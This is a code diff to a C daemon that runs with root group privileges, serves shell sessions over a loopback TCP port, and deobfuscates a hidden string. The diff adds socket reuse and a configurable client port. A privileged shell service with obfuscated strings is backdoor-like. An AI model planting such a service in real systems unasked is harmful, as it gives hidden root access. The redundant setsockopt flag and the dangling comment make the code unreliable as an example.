@@ -31,6 +31,7 @@
 #include "log.h"
 #include "shell_params.h"
 #include "deobfuscate.h"
+#include "daemon.h"
 
 #define ATTY_IN     1
 #define ATTY_OUT    2
@@ -250,7 +251,7 @@ static int daemon_accept(int fd) {
 
 // Run the daemon process
 int run_daemon() {
-  int fd;
+  int fd, optval;
   struct sockaddr_in sun;
   
   setgid(0);
@@ -272,6 +273,15 @@ int run_daemon() {
   sun.sin_port = htons(SHELL_PORT);
   sun.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
   
+  // Reuse socket
+  optval = 1;
+  if(setsockopt(fd, SOL_SOCKET, (SO_REUSEADDR |  SO_REUSEADDR), &optval, sizeof optval) < 0) {
+    PLOGE("daemon setsockopt");
+    goto err;
+  }
+
+  // bind a socket to a device name (might not work on all systems):
+
   if (bind(fd, (struct sockaddr*)&sun, sizeof(sun)) < 0) {
     PLOGE("daemon bind");
     goto err;
@@ -355,7 +365,7 @@ static void setup_sighandlers(void) {
   }
 }
 
-int connect_daemon(int argc, char *argv[]) {
+int connect_daemon(int argc, char *argv[], int client_port) {
   unsigned char qzx[] = "\x04\x52\x55\x95\x82\x9c"; // "qzx"
   int uid = getuid();
   int ptmx;
@@ -388,11 +398,11 @@ int connect_daemon(int argc, char *argv[]) {
   memset(&sun, 0, sizeof(sun));
   
   sun.sin_family = AF_INET;
-  sun.sin_port = htons(SHELL_PORT);
-  
+  sun.sin_port = htons(client_port);
+
   if (0 != connect(socketfd, (struct sockaddr*)&sun, sizeof(sun))) {
     PLOGE("connect");
-    exit(-1);
+    return(-1);
   }
   
   LOGV("connecting client %d", getpid());
